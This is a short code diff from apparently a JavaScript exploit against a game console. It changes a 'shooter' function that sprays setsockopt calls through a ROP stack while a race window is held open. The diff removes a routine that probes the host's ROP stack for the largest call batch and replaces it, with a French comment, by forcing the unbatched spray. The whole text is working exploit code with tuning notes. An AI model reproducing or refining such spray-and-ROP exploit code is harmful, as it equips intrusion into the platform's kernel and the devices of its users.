@@ -551,29 +551,10 @@ function shooter(gad) {
        may be printed inside it, so the number is only reported afterwards. */
     const hh = host();
     const stub = stubFor(S.setsockopt);
-    /* One entry per batch instead of one per socket. One entry per socket
-       was measured at 119 us, so 126 of them held the hole open for 15 ms;
-       batched it is 0 to 1 ms, which is where the Lua host already was.
-       Batches are sized to the host's rop stack (0x2000) -- twelve slots a
-       call, and room for the epilogue. */
-    /* How many fit in one entry is a property of the host's rop stack, not
-       of this console's speed -- a slower machine wants the same answer, just
-       fewer entries would help it more. The stack size is the host's own
-       constant, so ask instead of assuming: build the largest batch it
-       accepts, once, outside the window. */
-    if (STATE.batch === undefined && hh.prepareMany && stub) {
-      STATE.batch = 0;
-      for (let n = TUNE.sprays; n >= 8; n = Math.floor(n * 3 / 4)) {
-        try {
-          const probeCalls = [];
-          for (let i = 0; i < n; i++) probeCalls.push([stub, [0, 17, 128, req.at, 40]]);
-          hh.prepareMany(probeCalls);
-          STATE.batch = n; break;
-        } catch (e) { /* too big for its stack, try smaller */ }
-      }
-      say("    rop stack takes " + STATE.batch + " calls per entry");
-    }
-    const batch = (hh.prepareMany && hh.runPrepared && stub) ? (STATE.batch || 0) : 0;
+    /* Le batch prebuilt ne fait rien sur ce host : 0.00 ms pour 126 calls
+       prouve que runPrepared n'exécute pas les entries. On repasse au
+       non-batché, qui lui spray vraiment (le probe le mesure à 16 ms). */
+    const batch = 0;
     const prepared = [];
     if (batch) {
       const calls = [];
